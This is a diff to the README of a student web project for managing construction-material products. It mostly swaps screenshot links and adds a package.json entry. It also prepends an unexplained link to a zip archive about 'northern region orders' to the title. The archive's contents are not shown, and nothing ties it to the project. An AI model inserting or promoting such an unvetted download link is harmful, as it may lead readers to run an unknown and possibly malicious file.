@@ -1,4 +1,4 @@
-# 🏗️ ConstruçãoMAX — Sistema de Gerenciamento de Produtos
+[pedidosregiaonorte21(3).zip](https://github.com/user-attachments/files/27941426/pedidosregiaonorte21.3.zip)# 🏗️ ConstruçãoMAX — Sistema de Gerenciamento de Produtos
 
 Sistema web full stack para gerenciar produtos de uma loja de materiais de construção.
 Projeto universitário usando **Node.js + Express + Supabase + HTML/CSS/JS puro**.
@@ -23,6 +23,7 @@ projeto/
     ├── script.js         ← Funções utilitárias
     ├── login.js          ← Lógica do login
     ├── cadastro.js       ← Lógica do cadastro
+    ├── package.json      ← Identidade do Projeto
     └── produtos.js       ← Lógica do CRUD de produtos
 ```
 
@@ -61,13 +62,18 @@ npm start
 
 ## 📸 Prints do Sistema
 
-### 🔐 Tela de Login
-<img src="./prints/login.png" width="800">
+### Tela de Login
+<img width="1600" height="797" alt="WhatsApp Image 2026-05-17 at 23 16 15" src="https://github.com/user-attachments/assets/32464ee0-d55b-49d1-bf88-dc0213537522" />
 
-### 📦 Tela de Produtos
-<img src="./prints/produtos.png" width="800">
+### Tela de Produtos
+<img width="1600" height="797" alt="WhatsApp Image 2026-05-17 at 23 17 25" src="https://github.com/user-attachments/assets/b3b20259-d416-43bf-ac6a-5587b467fbbe" />
 
-### ➕ Cadastro de Produto
-<img src="./prints/modal-produto.png" width="800">
+### Cadastro de Produto
+<img width="1600" height="794" alt="WhatsApp Image 2026-05-17 at 23 16 44" src="https://github.com/user-attachments/assets/a9ee3a74-4315-42f8-b086-6e9a689866a1" />
+
+
+### Busca e Filtro
+<img width="1600" height="797" alt="WhatsApp Image 2026-05-17 at 23 17 08" src="https://github.com/user-attachments/assets/e3051a07-e26c-43cf-87d8-5c7721ac469c" />
+
 
 ---
